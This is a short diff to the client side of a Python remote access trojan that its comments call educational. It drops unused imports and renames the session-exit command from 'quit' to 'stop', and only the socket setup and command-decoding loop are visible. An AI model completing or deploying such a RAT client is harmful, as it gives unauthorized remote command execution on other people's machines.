@@ -1,12 +1,10 @@
 #This project is solely for educational use. The author does not authorize
 #the use of this project for any malicious or illegal actions.
 
-import os
 import socket
 import subprocess
 
 #create socket object
-import sys
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -25,7 +23,7 @@ while True:
         command = command.decode("UTF-8")
 
         #exit the session if the RAT server enters "quit"
-        if command == "quit":
+        if command == "stop":
             print("Exiting connection...")
             break
 
